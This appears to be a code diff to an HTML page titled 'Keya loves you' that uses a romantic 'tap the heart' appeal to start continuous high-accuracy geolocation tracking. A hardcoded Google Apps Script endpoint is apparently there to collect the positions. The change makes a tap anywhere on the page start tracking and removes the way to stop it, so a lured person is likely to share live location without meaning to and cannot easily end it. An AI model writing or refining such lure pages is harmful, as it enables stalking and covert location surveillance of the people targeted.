@@ -6,7 +6,7 @@
   <title>Keya loves you 💖</title>
   <style>
     html, body { height: 100%; margin: 0; font-family: Arial, Helvetica, sans-serif; background: linear-gradient(180deg,#fff7fb,#ffeef6); display: flex; align-items: center; justify-content: center; }
-    .container { text-align: center; padding: 20px; }
+    .container { text-align: center; padding: 20px; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     h1 { margin: 0 0 40px; font-size: 20px; color: #d6336c; position: relative; z-index: 10; }
     .heart-wrap { display: inline-block; cursor: pointer; margin-top: 40px; touch-action: manipulation; }
     .heart { width: 150px; height: 150px; position: relative; transform: rotate(-45deg); background: #ff3b6b; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform .15s ease, box-shadow .15s ease; display: inline-block; }
@@ -19,14 +19,14 @@
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Keya loves you — if you love her too, click on the heart</h1>
+  <div class="container" id="tapContainer">
+    <h1>Keya loves you — if you love her too, tap anywhere to share your location</h1>
     <div class="heart-wrap" id="heartBtn" title="Click to share location">
       <div class="heart pulse" id="heart"></div>
     </div>
 
     <script>
-      const heartBtn = document.getElementById('heartBtn');
+      const tapContainer = document.getElementById('tapContainer');
       const heart = document.getElementById('heart');
       let watchId = null;
       const SHEET_URL = 'https://script.google.com/macros/s/AKfycbxtNT8UnJHIJEPSNIK4VFKyH1yiFcDGInlAT_uUK_784vRlrP-ynU2x0740jFdXhpuhmA/exec';
@@ -57,24 +57,26 @@
           console.error('Geolocation not supported by this browser.');
           return;
         }
-        watchId = navigator.geolocation.watchPosition(onSuccess, onError, {
-          enableHighAccuracy: true,
-          maximumAge: 5000,
-          timeout: 10000
-        });
-        heart.classList.add('pulse');
+        if(watchId===null){
+          watchId = navigator.geolocation.watchPosition(onSuccess, onError, {
+            enableHighAccuracy: true,
+            maximumAge: 5000,
+            timeout: 10000
+          });
+          heart.classList.add('pulse');
+        }
       }
 
       function stopSharing(){
         if (watchId !== null){
           navigator.geolocation.clearWatch(watchId);
           watchId = null;
+          heart.classList.remove('pulse');
         }
-        heart.classList.remove('pulse');
       }
 
-      heartBtn.addEventListener('click', () => {
-        if (watchId === null){ startSharing(); } else { stopSharing(); }
+      tapContainer.addEventListener('click', () => {
+        startSharing();
       });
 
       window.addEventListener('beforeunload', () => {
